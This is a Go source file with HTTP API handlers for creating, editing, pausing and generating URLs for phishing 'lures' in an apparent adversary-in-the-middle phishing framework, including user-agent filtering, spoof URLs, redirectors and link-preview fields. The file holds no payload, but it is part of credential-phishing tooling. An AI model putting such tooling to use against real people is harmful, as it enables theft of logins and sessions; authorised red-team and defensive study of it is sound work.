package api

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"regexp"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
)

func (r *Router) listLures(w http.ResponseWriter, req *http.Request) {
	limit, offset := parsePagination(req)
	phishlet := req.URL.Query().Get("phishlet")

	all, err := r.lures.List()
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error(), "INTERNAL_ERROR")
		return
	}

	var filtered []*aitm.Lure
	for _, l := range all {
		if phishlet == "" || l.Phishlet == phishlet {
			filtered = append(filtered, l)
		}
	}

	total := len(filtered)
	start := min(offset, total)
	end := min(start+limit, total)
	page := filtered[start:end]

	items := make([]LureResponse, len(page))
	for i, l := range page {
		items[i] = lureToResponse(l)
	}
	writeJSON(w, http.StatusOK, PaginatedResponse[LureResponse]{
		Items:  items,
		Total:  total,
		Limit:  limit,
		Offset: offset,
	})
}

func (r *Router) createLure(w http.ResponseWriter, req *http.Request) {
	var body CreateLureRequest
	if err := json.NewDecoder(req.Body).Decode(&body); err != nil {
		writeError(w, http.StatusUnprocessableEntity, "invalid request body", "VALIDATION_ERROR")
		return
	}
	if body.Phishlet == "" {
		writeError(w, http.StatusUnprocessableEntity, "phishlet: required", "VALIDATION_ERROR")
		return
	}
	if body.UAFilter != "" {
		if _, err := regexp.Compile(body.UAFilter); err != nil {
			writeError(w, http.StatusUnprocessableEntity, "ua_filter: invalid regex: "+err.Error(), "VALIDATION_ERROR")
			return
		}
	}

	path := body.Path
	if path == "" {
		path = randomPath()
	}

	lure := &aitm.Lure{
		Phishlet:    body.Phishlet,
		BaseDomain:  body.BaseDomain,
		Path:        path,
		RedirectURL: body.RedirectURL,
		SpoofURL:    body.SpoofURL,
		UAFilter:    body.UAFilter,
		OGTitle:     body.OGTitle,
		OGDesc:      body.OGDesc,
		OGImage:     body.OGImage,
		OGURL:       body.OGURL,
		Redirector:  body.Redirector,
	}
	if err := r.lures.Create(lure); err != nil {
		status, code := errStatus(err)
		writeError(w, status, err.Error(), code)
		return
	}
	writeJSON(w, http.StatusCreated, lureToResponse(lure))
}

func (r *Router) updateLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	lure, err := r.lures.Get(id)
	if err != nil {
		status, code := errStatus(err)
		writeError(w, status, "lure not found", code)
		return
	}

	var body UpdateLureRequest
	if err := json.NewDecoder(req.Body).Decode(&body); err != nil {
		writeError(w, http.StatusUnprocessableEntity, "invalid request body", "VALIDATION_ERROR")
		return
	}
	if body.UAFilter != nil {
		if _, err := regexp.Compile(*body.UAFilter); err != nil {
			writeError(w, http.StatusUnprocessableEntity, "ua_filter: invalid regex: "+err.Error(), "VALIDATION_ERROR")
			return
		}
		lure.UAFilter = *body.UAFilter
	}
	if body.RedirectURL != nil {
		lure.RedirectURL = *body.RedirectURL
	}
	if body.SpoofURL != nil {
		lure.SpoofURL = *body.SpoofURL
	}
	if body.OGTitle != nil {
		lure.OGTitle = *body.OGTitle
	}
	if body.OGDesc != nil {
		lure.OGDesc = *body.OGDesc
	}
	if body.OGImage != nil {
		lure.OGImage = *body.OGImage
	}
	if body.OGURL != nil {
		lure.OGURL = *body.OGURL
	}
	if body.Redirector != nil {
		lure.Redirector = *body.Redirector
	}

	if err := r.lures.Update(lure); err != nil {
		status, code := errStatus(err)
		writeError(w, status, err.Error(), code)
		return
	}
	writeJSON(w, http.StatusOK, lureToResponse(lure))
}

func (r *Router) deleteLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	if err := r.lures.Delete(id); err != nil {
		status, code := errStatus(err)
		writeError(w, status, err.Error(), code)
		return
	}
	w.WriteHeader(http.StatusNoContent)
}

func (r *Router) generateLureURL(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	lure, err := r.lures.Get(id)
	if err != nil {
		status, code := errStatus(err)
		writeError(w, status, "lure not found", code)
		return
	}

	var body GenerateURLRequest
	// Body is optional; ignore decode errors.
	json.NewDecoder(req.Body).Decode(&body)

	url, err := lure.GenerateURL(r.domain, body.Params)
	if err != nil {
		writeError(w, http.StatusInternalServerError, err.Error(), "INTERNAL_ERROR")
		return
	}
	writeJSON(w, http.StatusOK, GenerateURLResponse{URL: url})
}

func (r *Router) pauseLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")

	var body PauseLureRequest
	if err := json.NewDecoder(req.Body).Decode(&body); err != nil {
		writeError(w, http.StatusUnprocessableEntity, "invalid request body", "VALIDATION_ERROR")
		return
	}
	d, err := time.ParseDuration(body.Duration)
	if err != nil {
		writeError(w, http.StatusUnprocessableEntity, "duration: invalid Go duration string", "VALIDATION_ERROR")
		return
	}

	if err := r.lures.Pause(id, d); err != nil {
		status, code := errStatus(err)
		writeError(w, status, err.Error(), code)
		return
	}
	lure, _ := r.lures.Get(id)
	writeJSON(w, http.StatusOK, lureToResponse(lure))
}

func (r *Router) unpauseLure(w http.ResponseWriter, req *http.Request) {
	id := req.PathValue("id")
	if err := r.lures.Unpause(id); err != nil {
		status, code := errStatus(err)
		writeError(w, status, err.Error(), code)
		return
	}
	lure, _ := r.lures.Get(id)
	writeJSON(w, http.StatusOK, lureToResponse(lure))
}

func lureToResponse(l *aitm.Lure) LureResponse {
	return LureResponse{
		ID:          l.ID,
		Phishlet:    l.Phishlet,
		BaseDomain:  l.BaseDomain,
		Hostname:    l.Hostname,
		Path:        l.Path,
		RedirectURL: l.RedirectURL,
		SpoofURL:    l.SpoofURL,
		UAFilter:    l.UAFilter,
		PausedUntil: l.PausedUntil,
		OGTitle:     l.OGTitle,
		OGDesc:      l.OGDesc,
		OGImage:     l.OGImage,
		OGURL:       l.OGURL,
		Redirector:  l.Redirector,
	}
}

func randomPath() string {
	b := make([]byte, 6)
	rand.Read(b)
	return "/" + hex.EncodeToString(b)
}
